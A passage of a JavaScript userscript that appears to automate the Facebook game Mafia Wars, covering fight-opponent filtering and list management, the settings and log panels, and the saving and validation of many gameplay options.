    if (GM_getValue('fightMobMode')) {
      // Mob fight mode.  Fight players of higher level but smaller mafia.
      if (opponent.level > (opponentLevelMax * 501 / opponent.mafia)) {
        levelMaxCount++;
        continue;
      }
    } else {
      if (opponent.level > opponentLevelMax) {
        levelMaxCount++;
        continue;
      }
    }
    if (opponent.mafia > opponentMafiaMax) {
      mafiaMaxCount++;
      continue;
    }
    if (opponent.mafia < opponentMafiaMin) {
      mafiaMinCount++;
      continue;
    }

    if (fightNames && avoidNames && isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_FIGHT_RANDOM)) {
      namesCount++;
      continue;
    }

    if (fightNames && onlyNames && !isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_FIGHT_RANDOM)) {
      namesCount++;
      continue;
    }

    if (!opponent.id) continue;

    // Check iced oponents
    if (isGMChecked('iceCheck') && opponent.iced) {
      icedCount++;
      continue;
    }

    // Check against previous opponents.
    var idx = fightListAvoid.indexOf(opponent);
    if (idx != -1) {
      // We can't fight them, but update their info.
      fightListAvoid.get()[idx].update(opponent);
      blacklistCount++;
      continue;
    }

    if (avoidLosers) {
      idx = fightListInactive.indexOf(opponent);
      if (idx != -1) {
        fightListInactive.get()[idx].update(opponent);
        blacklistCount++;
        continue;
      }
      idx = fightListActive.indexOf(opponent);
      if (idx != -1) {
        fightListActive.get()[idx].update(opponent);
        blacklistCount++;
        continue;
      }
    }
    if (!fightListNew.add(opponent)) {
      blacklistCount++;
      continue;
    }
    // This opponent is new and acceptable.
    DEBUG('Found new fight opponent: name=' + opponent.name +
          ', level=' + opponent.level + ', mafia=' + opponent.mafia + ', faction=' + opponent.faction);
  }

  var disqualifiedCount = levelMaxCount + mafiaMaxCount + mafiaMinCount + namesCount + factionCount + icedCount + blacklistCount;
  if (countOpp <= disqualifiedCount) {
    addToLog('info Icon', 'Out of the ' + countOpp + ' opponent(s) listed on the fight page '+disqualifiedCount+' disqualified.');
    DEBUG(levelMaxCount + ' on max level, ' +  mafiaMaxCount + ' on max mafia, ' +  mafiaMinCount + ' on min mafia,<br>' +
          namesCount + ' on name pattern, ' +  factionCount + ' on faction, ' +  icedCount + ' already iced, <br>' +
          blacklistCount + ' by blacklisting (stronger opponents).<br>');
  }

  newOpponents = fightListNew.get();
  if (!newOpponents.length) return -1;

  if (newOpponents.length > len) {
    fightListNew.set();
  }

  return newOpponents[Math.floor(Math.random() * newOpponents.length)];
}

function setFightOpponentActive(player) {
  if (!player) return;

  // Add the opponent to the active list.
  DEBUG('Marking fight opponent active, id=' + player.id);
  fightListActive.add(player, 10);
  fightListActive.set();

  // Remove the opponent from the other fight lists.
  if (fightListInactive.remove(player))
    fightListInactive.set();
  if (fightListNew.remove(player))
    fightListNew.set();
  if (fightListAvoid.remove(player))
    fightListAvoid.set();
}

function setFightOpponentInactive(player) {
  if (!player) return;

  // Add the opponent to the inactive list.
  DEBUG('Marking fight opponent inactive, id=' + player.id);
  fightListInactive.add(player, 10);
  fightListInactive.set();

  // Remove the opponent from the other fight lists.
  if (fightListActive.remove(player))
    fightListActive.set();
  if (fightListNew.remove(player))
    fightListNew.set();
  if (fightListAvoid.remove(player))
    fightListAvoid.set();
}

function setFightOpponentAvoid(player) {
  if (!player) return;

  // Add the opponent to the avoid list.
  DEBUG('Marking fight opponent avoid, id=' + player.id);
  fightListAvoid.add(player, 100);
  fightListAvoid.set();

  // Remove the opponent from all other fight lists.
  if (fightListActive.remove(player))
    fightListActive.set();
  if (fightListInactive.remove(player))
    fightListInactive.set();
  if (fightListNew.remove(player))
    fightListNew.set();

  // Only remove the first occurence from the user-supplied list.
  removeSavedListItem('pfightlist', player.id);
}

function setHitmanOpponentAvoid(opponent) {
  if (!opponent) return;

  // Add the opponent to the avoid list.
  DEBUG('Marking hitlist opponent ' + opponent + ' avoid.');
  addSavedListItem('hitmanListAvoid', opponent, 100);
}

function toggleSettings() {
  updateMastheadMenu();
  if (settingsOpen === false) {
    destroyByID('apimg');
    makeElement('img', document.getElementById('ap_img'), {'id':'apimg','src':'http://playerscripts.co.uk/images/mwap_graphics/32_grey.png'});

    // Stop any running timers so the settings box won't disappear.
    Autoplay.clearTimeout();
    Reload.clearTimeout();
    settingsOpen = true;
    createSettingsBox();
    showSettingsBox();
  } else {
    settingsOpen = false;
    destroyByID('MWAPSettingsBox');
    // Restart the timers.
    Autoplay.delay = 150;
    Autoplay.start();
    autoReload(false,'toggle settings');
  }
}

function showSettingsBox() {
  var settingsBoxContainer = document.getElementById('MWAPSettingsBox');
  if (settingsBoxContainer) {
    settingsBoxContainer.style.display = 'block';
  }
}

function showMafiaLogBox() {
  if (!document.getElementById('mafiaLogBox')) {
    createLogBox();
  } else {
    var mafiaLogBoxDiv = document.getElementById('mafiaLogBox');
    mafiaLogBoxDiv.style.display = 'block';
  }
  if (!debug && GM_getValue('logOpen') != 'open' &&
      !isGMChecked('autoLog')) {
    alert('Logging is not enabled. To see new activity here, please open your settings and check "Enable logging" in the General tab.');
  }
  GM_setValue('logOpen', 'open');
}
function hideMafiaLogBox() {
  var mafiaLogBoxDiv = document.getElementById('mafiaLogBox');
  mafiaLogBoxDiv.style.display = 'none';
  GM_setValue('logOpen', 'closed');
}

function handleVersionChange() {
  addToLog('updateGood Icon', 'Now running version ' + SCRIPT.version + ' <a href="http://www.playerscripts.com/" target="_blank">We need your help - DONATE - playerscripts.com</a>');

  if (GM_getValue('buildCarId') >= cityCars.length) {
    GM_setValue('buildCarId', cityCars.length - 1)
  }

  if (GM_getValue('buildWeaponId') >= cityWeapons.length) {
    GM_setValue('buildWeaponId', cityWeapons.length - 1)
  }

  if (GM_getValue('buildArmorId') >= cityArmor.length) {
    GM_setValue('buildArmorId', cityArmor.length - 1)
  }

  if (GM_getValue('buildAnimalId') >= cityAnimals.length) {
    GM_setValue('buildAnimalId', cityAnimals.length - 1)
  }

  if (GM_getValue('buildPortId') >= cityPort.length) {
    GM_setValue('buildPortId', cityPort.length - 1)
  }

  // Update saved script version
  GM_setValue('version', SCRIPT.version);
}

function saveDefaultSettings() {
  // Assume all settings have been cleared and set defaults.
  // For groups of radio buttons, one must be checked and all others cleared.
  // For checkboxes, no need to default if the option should be off.
  var i;

  // General tab.
  GM_setValue('autoClick', 'checked');
  GM_setValue('r1', '30');
  GM_setValue('r2', '110');
  GM_setValue('autoHeal', 'checked');
  GM_setValue('healthLevel', '50');
  GM_setValue('forceHealOpt1', 'checked');
  GM_setValue('healLocation', NY);
  GM_setValue('bankConfig', '50000');
  GM_setValue('bankConfigCuba', '50000');
  GM_setValue('bankConfigMoscow', '50000');
  GM_setValue('bankConfigBangkok', '50000');
  GM_setValue('bankConfigVegas', '50000');
  GM_setValue('bankConfigItaly', '50000');
  GM_setValue('autoPauseBefore', 'checked');
  GM_setValue('autoPauseAfter', 0);
  GM_setValue('autoPauseExp', '50');
  GM_setValue('autoLog', 'checked');
  GM_setValue('autoLogLength', '300');
  GM_setValue('logPlayerUpdates', 'checked');
  GM_setValue('logPlayerUpdatesMax', '25');
  GM_setValue('d1', '3');
  GM_setValue('d2', '5');
  GM_setValue('stamina_min_heal', '0');
  GM_setValue('idleLocation', NY);
  GM_setValue('autoHelp', 'checked');
  GM_setValue('autoBurnerHelp', 'checked');
  GM_setValue('autoPartsHelp', 'checked');
  GM_setValue('autoLottoBonusItem',3);
  GM_setValue('autoWarTargetList', '');
  GM_setValue('warMode', 0);
  GM_setValue('autoGiftAccept', 0);
  GM_setValue('autoGiftAcceptChoice', 0);
  GM_setValue('autoGiftAcceptReward', 0);
//  GM_setValue('autoSafehouse', 0);

  // Misc Tab
  GM_setValue('autoResetTimers', 0);
  GM_setValue('autoStat', 0);
  GM_setValue('autoStatDisable', 0);

  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i)
    GM_setValue(autoStatModes[i], 0);

  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i)
    GM_setValue(autoStatPrios[i], 0);

  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i)
    GM_setValue(autoStatBases[i], 0);

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i)
    GM_setValue(autoStatRatios[i], 0);

  for (i = 0, iLength=autoStatFallbacks.length; i < iLength; ++i)
    GM_setValue(autoStatFallbacks[i], 0);

  GM_setValue('filterLog', 0);
  GM_setValue('filterOpt', 0);
  logFilterOnOff(1);
  GM_setValue('filterPass', defaultPassPatterns.join('\n'));
  GM_setValue('filterFail', defaultFailPatterns.join('\n'));

  // Energy tab.
  GM_setValue('estimateJobRatio', '2');
  GM_setValue('autoEnergyPackForce', 0);
  GM_setValue('autoEnergyPackForcePts', 0);

  // Stamina tab.
  GM_setValue('staminaSpendHow', STAMINA_HOW_FIGHT_RANDOM);
  GM_setValue('fightLocation', NY);
  GM_setValue('fightLevelMax', 100);
  GM_setValue('fightMafiaMax', 501);
  GM_setValue('fightMafiaMin', 1);

  GM_setValue('fightNames', 'checked');
  GM_setValue('fightAvoidNames', 'checked');
  GM_setValue('fightOnlyNames', 0);

  GM_setValue('hitmanLocation', NY);
  GM_setValue('hitmanNames', 'checked');
  GM_setValue('hitmanAvoidNames', 'checked');
  GM_setValue('fightOnlyNames', 0);

  GM_setValue('fightRemoveStronger', 'checked');

  GM_setValue('fightClanName', defaultClans.join('\n'));
  GM_setValue('hitmanClanName', defaultClans.join('\n'));

  GM_setValue('randomFightLocations','10000');
  GM_setValue('randomRobLocations','10000');
  GM_setValue('randomHitmanLocations','10000');
  GM_setValue('randomSpendModes','10000000');

  GM_setValue('robLocation', NY);
  GM_setValue('selectStaminaKeep', 0);
  GM_setValue('selectStaminaUse', 0);
  GM_setValue('selectStaminaKeepMode', 0);
  GM_setValue('selectStaminaUseMode', 0);
  GM_setValue('selectMissionStaminaKeep', 0);
  GM_setValue('selectMissionStaminaKeepMode', 0);

//needchange
  GM_setValue('selectMissionEnergyKeep', 0);
  GM_setValue('selectMissionEnergyKeepMode', 0);

  GM_setValue('selectEnergyKeep', 0);
  GM_setValue('selectEnergyUse', 0);
  GM_setValue('selectEnergyKeepMode', 0);
  GM_setValue('selectEnergyUseMode', 0);

  // Health tab.
  GM_setValue('stopPA', 'checked');
  GM_setValue('stopPAHealth', 29);

  // Cash tab
  GM_setValue('askChopShopParts', 'unchecked');
  GM_setValue('askDepotParts', 'unchecked');
  GM_setValue('askArmoryParts', 'unchecked');
  GM_setValue('askZooParts', 'unchecked');
  GM_setValue('askCasinoParts', 'unchecked');

  // Other settings.
  GM_setValue('logOpen', 'open');

  addToLog('process Icon', 'Options reset to defaults.');
}

function saveSettings() {
  var i;
  //Start Save General Tab Settings
  //General Tab Checkboxes
  saveCheckBoxElementArray([
    'autoClick','autoPause','idleInCity','autoLottoOpt','autoLottoBonus','burnFirst','featJob','autoTournament','useSecretStashItems','autoProcessPopups','autoDailyTake'
  ]);
  //General Tab Settings
  // Validation of refresh and delay values
  var refreshLow = parseInt(document.getElementById('r1').value); var refreshHigh = parseInt(document.getElementById('r2').value);
  var delayLow = parseInt(document.getElementById('d1').value); var delayHigh = parseInt(document.getElementById('d2').value);

  if (refreshLow > refreshHigh || refreshLow < 8 || isNaN(refreshLow) || isNaN(refreshHigh) ) {
    alert('General Tab: The refresh values are invalid, defaulting them to 30s->110s.\nPS: Both have to be greater than the high delay value and at least 8s.');
    document.getElementById('r1').value = 30; document.getElementById('r2').value = 110;
    return;
  } else if (delayLow > delayHigh || delayLow < 1 || delayHigh < 2|| isNaN(delayLow) || isNaN(delayHigh) ) {
    alert('General Tab: The delay values are invalid, defaulting them to 3s->5s.\nPS: Low delay has to be at least 1s, high delay at least 2s.');
    document.getElementById('d1').value = 3; document.getElementById('d2').value = 5;
    return;
  } else if (refreshLow <= delayHigh) {
    alert('General Tab: Your low refresh is <= high delay, please adjust.');
    return;
  }
  GM_setValue('r1', String(refreshLow));
  GM_setValue('r2', String(refreshHigh));
  GM_setValue('d1', String(delayLow));
  GM_setValue('d2', String(delayHigh));

  if (saveCheckBoxElement('autoPauseBefore')) {
    GM_setValue('autoPauselvlExp', ptsToNextLevel);
    GM_setValue('autoPauseActivated', false);
  }
  if (saveCheckBoxElement('autoPauseAfter')) {
    GM_setValue('autoPauselvlExp', ptsToNextLevel);
  }
  var autoPauseExp = parseInt(document.getElementById('autoPauseExp').value)
  if(isNaN(autoPauseExp)) autoPauseExp = 0;
  GM_setValue('autoPauseExp', autoPauseExp);

  GM_setValue('idleLocation', document.getElementById('idleLocation').selectedIndex);

  GM_setValue('autoLottoBonusItem', document.getElementById('autoLottoList').selectedIndex);

  GM_setValue('burnOption', document.getElementById('burnOption').value);
  GM_setValue('featJobIndex', document.getElementById('featJobIndex').selectedIndex);

  GM_setValue('autoTournamentClass', document.getElementById('autoTournamentClass').selectedIndex);

  for (i = 0, iLength=cities.length; i < iLength; ++i) {
    if (cities[i][CITY_SIDES].length > 0) {
      var id = cities[i][CITY_SIDE_NAME];
      for (var j = 0, jLength = cities[i][CITY_SIDES].length; j < jLength; ++j) {
        GM_setValue(id, document.getElementById(id).selectedIndex);
      }
    }
  }

  GM_setValue('secretStashItems', document.getElementById('secretStashItems').value);

  //End Save General Tab Settings

  //Start Save Display Tab Settings
  //Display Tab Checkboxes
  saveCheckBoxElementArray([
    'autoLog','logPlayerUpdates','filterLog','leftAlign','mastheadOnTop','fbwindowtitle','showPulse','showLevel','hideZyngaBanner',
    'hideAll'
  ]);

  //Display Tab Settings and Validation
  var logPlayerUpdates = (document.getElementById('logPlayerUpdates').checked === true);
  var logPlayerUpdatesMax = parseInt(document.getElementById('logPlayerUpdatesMax').value);
  if (logPlayerUpdates && (isNaN(logPlayerUpdatesMax) || logPlayerUpdatesMax < 0 || logPlayerUpdatesMax > 70)) {
    alert('The maximum number of player updates must be between 0 and 70.\nDefaulting it to 25.');
    document.getElementById('logPlayerUpdatesMax').value = 25;
    return;
  }

  var autoLogLength = parseInt(document.getElementById('autoLogLength').value)
  if(isNaN(autoLogLength)) autoLogLength = 3000;
  GM_setValue('autoLogLength', autoLogLength);
  GM_setValue('logPlayerUpdatesMax', logPlayerUpdatesMax);

  var filterOpt = document.getElementById('filterOpt').value;
  GM_setValue(filterOpt == 0 ? 'filterPass' : 'filterFail', document.getElementById('filterPatterns').value);
  GM_setValue('filterOpt', filterOpt);

  //End Save Display Tab Settings

  //Start Save Mafia Tab Settings
  //Mafia Tab Checkboxes
  saveCheckBoxElementArray([
    'autoAskJobHelp','acceptMafiaInvitations','autoAskHelponCC', 'autoLevelPublish','autoAchievementPublish','autoIcePublish','autoSecretStash','autoShareCoins','autoGlobalPublishing',
    'autoShareWishlist', 'autoHelp','autoWarHelp','autoBurnerHelp','autoPartsHelp','autoGiftAccept',
    //'sendEnergyPack','askEnergyPack','rewardEnergyPack','autoAcceptMsgGifts','autoAcceptMsgBoosts','autoSafehouse',
    'askEnergyPack','rewardEnergyPack','autoAcceptMsgGifts','autoAcceptMsgBoosts',
    'autoWar','autoWarPublish','autoWarRallyPublish','autoWarResponsePublish','autoWarRewardPublish'

  ]);
  //MafiaTab Settings and Validation
  // Examine share wishlist time
  var shareWishlistTime = parseInt(document.getElementById('autoShareWishlistTime').value);
  if (isNaN(shareWishlistTime) || parseFloat(shareWishlistTime) < 1) {
    alert('The share wishlist timer has to be at least 1 hour. For decimal numbers please use ".", e.g. 1.5.\nDefaulting it to 1 hour.');
    document.getElementById('autoShareWishlistTime').value = 1;
    return;
  }
  var autoAskJobHelpMinExp = parseInt(document.getElementById('autoAskJobHelpMinExp').value)
  if(isNaN(autoAskJobHelpMinExp)) autoAskJobHelpMinExp = 0;
  GM_setValue('autoAskJobHelpMinExp', autoAskJobHelpMinExp);

  GM_setValue('selectMoscowTier', (document.getElementById('selectMoscowTier').value)?document.getElementById('selectMoscowTier').value:0);
  GM_setValue('selectMoscowTiercheck', (document.getElementById('selectMoscowTier').value)?'checked':0);
  GM_setValue('selectBangkokTier', (document.getElementById('selectBangkokTier').value)?document.getElementById('selectBangkokTier').value:0);
  GM_setValue('selectBangkokTiercheck', (document.getElementById('selectBangkokTier').value)?'checked':0);
  GM_setValue('selectVegasTier', (document.getElementById('selectVegasTier').value)?document.getElementById('selectVegasTier').value:0);
  GM_setValue('selectVegasTiercheck', (document.getElementById('selectVegasTier').value)?'checked':0);
  GM_setValue('selectItalyTier', (document.getElementById('selectItalyTier').value)?document.getElementById('selectItalyTier').value:0);
  GM_setValue('selectItalyTiercheck', (document.getElementById('selectItalyTier').value)?'checked':0);

  var autoIcePublishFrequency = parseInt(document.getElementById('autoIcePublishFrequency').value);
  if(isNaN(autoIcePublishFrequency)) autoIcePublishFrequency = 1;

  GM_setValue('autoIcePublishFrequency', autoIcePublishFrequency);
  var autoSecretStashFrequency = parseInt(document.getElementById('autoSecretStashFrequency').value);
  if(isNaN(autoSecretStashFrequency)) autoSecretStashFrequency = 1;
  GM_setValue('autoSecretStashFrequency', autoSecretStashFrequency);

  GM_setValue('autoShareWishlistTime', shareWishlistTime);

  GM_setValue('autoGiftAcceptChoice', document.getElementById('autoGiftAcceptChoice').selectedIndex);
  GM_setValue('autoGiftAcceptReward', document.getElementById('autoGiftAcceptReward').selectedIndex);

  GM_setValue('warMode', document.getElementById('warMode').selectedIndex);

  GM_setValue('autoWarTargetList', document.getElementById('autoWarTargetList').value);
  //End Save Mafia Tab Settings

  //Missions Tab Checkboxes
  saveCheckBoxElementArray([
    'AutoMafiaMission','AutoMafiaCollection','AutoMafiaJob','AutoMafiaRemoved','AskMissionHelp','autoShareRewards'
  ]);
  //Start Save Autostat Tab Settings
  //Autostat Tab Checkboxes
  saveCheckBoxElementArray([
    'autoStat','autoStatDisable','autoStatAttackFallback','autoStatDefenseFallback','autoStatHealthFallback','autoStatEnergyFallback','autoStatStaminaFallback',
    'autoResetTimers'
  ]);
  //Autostat Settings and Validation
  GM_setValue('restAutoStat', 0);
  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i)
    GM_setValue(autoStatBases[i], document.getElementById(autoStatBases[i]).value);
  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i)
    GM_setValue(autoStatRatios[i], document.getElementById(autoStatRatios[i]).value);
  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i)
    GM_setValue(autoStatModes[i], document.getElementById(autoStatModes[i]).value);
  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i)
    GM_setValue(autoStatPrios[i], document.getElementById(autoStatPrios[i]).value);

  GM_setValue('autoEnforcedTitle', (document.getElementById('autoEnforcedTitle').value)?document.getElementById('autoEnforcedTitle').value:"");
  // Validate autoEnforcedTitleTime
  var autoEnforcedTitleTime = document.getElementById('autoEnforcedTitleTime').value;
  if (isNaN(autoEnforcedTitleTime) || parseFloat(autoEnforcedTitleTime) < 1) {
    alert('The Enforce Title timer has to be at least 1 hour. For decimal numbers please use ".", e.g. 1.5.\nDefaulting it to 1 hour.');
    document.getElementById('autoEnforcedTitleTime').value = 2;
    return;
  } else {
    GM_setValue('autoEnforcedTitleTime',autoEnforcedTitleTime);
  }

  // Validate the auto-stat setting.
  var autoStatOn = (document.getElementById('autoStat').checked === true);
  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i) {
    if (autoStatOn && isNaN(document.getElementById(autoStatBases[i]).value)) {
      alert('Please enter valid numbers for auto-stat ' + autoStatDescrips[i+1] + ' (Misc tab). : ' + document.getElementById(autoStatBases[i]).value);
      return;
    }
  }

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i) {
    if (autoStatOn && isNaN(document.getElementById(autoStatRatios[i]).value)) {
      alert('Please enter valid numbers for auto-stat ' + autoStatDescrips[i+1] + ' (Misc tab).');
      return;
    }
  }

  //End Save Autostat Tab Settings

  //Start Save Energy Tab Settings
  //Energy Tab Checkboxes
  saveCheckBoxElementArray([
    'autoMission','endLevelOptimize','checkMiniPack','autoEnergyPack','autoEnergyPackForce',
    'hasHelicopter','hasGoldenThrone','isManiac','allowEnergyToLevelUp','skipfight'
  ]);
  //Energy Settings and Validation


  if (document.getElementById('autoMission').checked === true) {
    GM_setValue('repeatJob', 'checked');
  } else {
    GM_setValue('repeatJob', 0);
  }

  var multiple_jobs_list = [];
  var mastery_jobs_list = [];
  selectedTierValue = document.getElementById('selectTier').value.split('.');
  masteryCity = parseInt(selectedTierValue[0]);
  masteryTier = parseInt(selectedTierValue[1]);
  for (i = 0, iLength = missions.length; i < iLength; i++) {
    if (document.getElementById(missions[i][MISSION_NAME]).checked) {
      multiple_jobs_list.push(i);
    }
    if (masteryCity == missions[i][MISSION_CITY] &&
        masteryTier == missions[i][MISSION_TAB]) {
      mastery_jobs_list.push(i);
    }
  }
  setSavedList('selectMissionMultiple', multiple_jobs_list);
  setSavedList('masteryJobsList', mastery_jobs_list);
  GM_setValue('selectTier', document.getElementById('selectTier').value);
  // Validate the estimated job ratio setting.
  var autoEnergyPackOn = (document.getElementById('autoEnergyPack').checked === true );
  var estimateJobRatio = parseFloat(document.getElementById('estimateJobRatio').value);
  if (autoEnergyPackOn) {
    if (isNaN(estimateJobRatio)) {
      alert('Please enter a number between 0 and 3 for your estimated job xp to energy ratio');
      return;
    }
  }
  GM_setValue('estimateJobRatio', document.getElementById('estimateJobRatio').value);
  var autoEnergyPackForcePts = parseInt(document.getElementById('autoEnergyPackForcePts').value);
  if (isNaN(autoEnergyPackForcePts)) autoEnergyPackForcePts = 0;
  GM_setValue('autoEnergyPackForcePts', autoEnergyPackForcePts);

  // Validate and save energy limits settings.
  var selectEnergyUse = parseInt(document.getElementById('selectEnergyUse').value);
  var selectEnergyKeep = parseInt(document.getElementById('selectEnergyKeep').value);
  if (isNaN(selectEnergyUse) || isNaN(selectEnergyKeep)) {
    alert('Please enter numeric values for Energy reserve and Energy threshold.');
    return;
  }
//needchange
  // Validate and save mission energy limits settings.
  var selectMissionEnergyKeep = parseInt(document.getElementById('selectMissionEnergyKeep').value);
  if(isNaN(selectMissionEnergyKeep)) {
    alert('Please Enter Numeric Values For The Mission Energy Threshold.');
    return;
  }

  GM_setValue ('selectEnergyUse', selectEnergyUse);
  GM_setValue ('selectEnergyKeep', selectEnergyKeep);
  GM_setValue ('selectEnergyUseMode', document.getElementById('selectEnergyUseMode').selectedIndex);
  GM_setValue ('selectEnergyKeepMode', document.getElementById('selectEnergyKeepMode').selectedIndex);

//needchange
  GM_setValue ('selectMissionEnergyKeep', selectMissionEnergyKeep);
  GM_setValue ('selectMissionEnergyKeepMode', document.getElementById('selectMissionEnergyKeepMode').selectedIndex);

  //End Save Energy Tab Settings

  //Start Save Stamina Tab Settings
  //Stamina Tab Checkboxes

  //Stamina Settings and Validation
  // Validate stamina tab.
  var staminaTabSettings = validateStaminaTab();
  if (!staminaTabSettings) return;

  for (var key in staminaTabSettings) {
      GM_setValue(key, staminaTabSettings[key]);
  }
  update_nrg_stam();  //newchange needed to update energy / stamina color indicator after saving settings
  //End Save Stamina Tab Settings
  //Start Save Health Tab Settings
  //Health Tab Checkboxes
  saveCheckBoxElementArray([
    'autoHeal','attackCritical','hideInHospital','forceHealOpt3','forceHealOpt4','forceHealOpt5','forceHealOpt7','hideAttacks','stopPA'
  ]);
  //Heal Settings and Validation
  var autoHealOn  = (document.getElementById('autoHeal').checked === true);
  var healthLevel = parseInt(document.getElementById('healthLevel').value);
  if (autoHealOn && (!healthLevel || healthLevel < 1)) {
    alert('Health level for automatic healing must be 1 or more.');
    return;
  }
  GM_setValue('healthLevel', healthLevel);
  GM_setValue('healLocation', document.getElementById('healLocation').value);

  var staminaMinHeal = parseInt(document.getElementById('stamina_min_heal').value);
  if(isNaN(staminaMinHeal)) staminaMinHeal = 0;
  GM_setValue('stamina_min_heal', staminaMinHeal);

  var hideAttacks = (document.getElementById('hideAttacks').checked === true);
  var rideHitlistXP = parseInt(document.getElementById('rideHitlistXP').value);
  if (hideAttacks) {
    if (isNaN(rideHitlistXP) || rideHitlistXP < 0 || rideHitlistXP > 50) {
      alert('For the hitlistride XP please enter a number between 0 and 50 (default: 0).');
      return;
    } else {
      GM_setValue ('rideHitlistXP', rideHitlistXP);
    }
  }

  var stopPAHealth = parseInt(document.getElementById('stopPAHealth').value);
  if (stopPAHealth) {
    if (isNaN(stopPAHealth) || stopPAHealth < 0) {
      alert('Please enter a Power Attack Health level >= 0');
      return;
    } else {
      GM_setValue ('stopPAHealth', stopPAHealth);
    }
  }


  //Change autoheal shortcut if necessary
  if(!isGMChecked('autoHeal')) {
    document.getElementById('mwap_toggleheal').innerHTML=healOffIcon;
    document.getElementById('mwap_toggleheal').title = 'autoHeal unchecked';
    addToLog('healOffIcon Icon', 'autoHeal turned OFF by User');
  } else {
    if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB || GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTRIVALS_ROB){
      document.getElementById('mwap_toggleheal').innerHTML=healOnHoldIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked BUT OVERRULED - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnHoldIcon Icon', 'autoHeal turned ON by User, but OVERRULED');
    } else {
      document.getElementById('mwap_toggleheal').innerHTML=healOnIcon;
      document.getElementById('mwap_toggleheal').title = 'autoHeal checked - healing in '+ locations[GM_getValue('healLocation')] +' when health falls below '+GM_getValue('healthLevel')+'.';
      addToLog('healOnIcon Icon', 'autoHeal turned ON by User');
    }
  }

  //End Save Health Tab Settings

  //Start Save Cash Tab Settings
  //Cash Tab Checkboxes
  saveCheckBoxElementArray([
    'buildCar','buildWeapon','buildArmor','buildPort','buildAnimal','collectTakeNew York',
    'autoBank','autoBankCuba','autoBankMoscow','autoBankBangkok','autoBankVegas','autoBankItaly',
    'askShopParts','askDepotParts','askArmorParts','askZooParts','askCasinoParts'
  ]);

  GM_setValue('buildCarId', document.getElementById('buildCarId').selectedIndex);
  GM_setValue('buildWeaponId', document.getElementById('buildWeaponId').selectedIndex);
  GM_setValue('buildArmorId', document.getElementById('buildArmorId').selectedIndex);
  GM_setValue('buildAnimalId', document.getElementById('buildAnimalId').selectedIndex);

  GM_setValue('buildPortId', document.getElementById('buildPortId').selectedIndex);

  GM_setValue('askShopPartsId', document.getElementById('askShopPartsId').selectedIndex);
  GM_setValue('askDepotPartsId', document.getElementById('askDepotPartsId').selectedIndex);
  GM_setValue('askArmorPartsId', document.getElementById('askArmorPartsId').selectedIndex);
  GM_setValue('askZooPartsId', document.getElementById('askZooPartsId').selectedIndex);
  GM_setValue('askCasinoPartsId', document.getElementById('askCasinoPartsId').selectedIndex);

  var autoBankOn      = (document.getElementById('autoBank').checked === true);
  var autoBankCubaOn  = (document.getElementById('autoBankCuba').checked === true);
  var autoBankMoscowOn  = (document.getElementById('autoBankMoscow').checked === true);
  var autoBankBangkokOn  = (document.getElementById('autoBankBangkok').checked === true);
  var autoBankVegasOn  = (document.getElementById('autoBankVegas').checked === true);
  var autoBankItalyOn  = (document.getElementById('autoBankItaly').checked === true);
  var bankConfig      = document.getElementById('bankConfig').value;
  var bankConfigCuba      = document.getElementById('bankConfigCuba').value;
  var bankConfigMoscow      = document.getElementById('bankConfigMoscow').value;
  var bankConfigBangkok      = document.getElementById('bankConfigBangkok').value;
  var bankConfigVegas      = document.getElementById('bankConfigVegas').value;
  var bankConfigItaly      = document.getElementById('bankConfigItaly').value;
  var bankConfigInt   = parseInt(bankConfig);
  var bankConfigCubaInt   = parseInt(bankConfigCuba);
  var bankConfigMoscowInt   = parseInt(bankConfigMoscow);
  var bankConfigBangkokInt   = parseInt(bankConfigBangkok);
  var bankConfigVegasInt   = parseInt(bankConfigVegas);
  var bankConfigItalyInt   = parseInt(bankConfigItaly);

  GM_setValue('vaultHandling', document.getElementById('vaultHandling').selectedIndex);

  if (autoBankOn && (isNaN(bankConfigInt) || bankConfigInt < 10)) {
    alert('Minimum New York auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankCubaOn && (isNaN(bankConfigCubaInt) || bankConfigCubaInt < 10)) {
    alert('Minimum Cuba auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankMoscowOn && (isNaN(bankConfigMoscowInt) || bankConfigMoscowInt < 10)) {
    alert('Minimum Moscow auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankBangkokOn && (isNaN(bankConfigBangkokInt) || bankConfigBangkokInt < 10)) {
    alert('Minimum Bangkok auto-bank amount must be 10 or higher.');
    return;
  }

  if (autoBankVegasOn && (isNaN(bankConfigVegasInt) || bankConfigVegasInt < 1)) {
    alert('Minimum Las Vegas auto-bank amount must be 1 or higher.');
    return;
  }

  if (autoBankItalyOn && (isNaN(bankConfigItalyInt) || bankConfigItalyInt < 1)) {
    alert('Minimum Italy auto-bank amount must be 1 or higher.');
    return;
  }
  GM_setValue('bankConfig', bankConfig);
  GM_setValue('bankConfigCuba', bankConfigCuba);
  GM_setValue('bankConfigMoscow', bankConfigMoscow);
  GM_setValue('bankConfigBangkok', bankConfigBangkok);
  GM_setValue('bankConfigVegas', bankConfigVegas);
  GM_setValue('bankConfigItaly', bankConfigItaly);
  //End Save Cash Tab Settings

  //Start Save About Tab Settings
  //About Tab Checkboxes
  saveCheckBoxElementArray([
    'TestChanges'
  ]);
  //End Save About Tab Settings

  //Start Various Settings
  GM_setValue('propertyId', '12');

  // Clear the job state.
  setSavedList('jobsToDo', []);
  setSavedList('itemList', []);

  // Clear lists for mastered and available jobs.
  GM_setValue('masteredJobs', '({0:{},1:{},2:{},3:{},4:{},5:{}})');
  GM_setValue('availableJobs', '({0:{},1:{},2:{},3:{},4:{},5:{}})');

  // Clear the fight/hit state.
  fightListNew.set([]);
  skipStaminaSpend = false;

  // Invoke choose sides
  chooseSides();

  //End Various Settings

  //
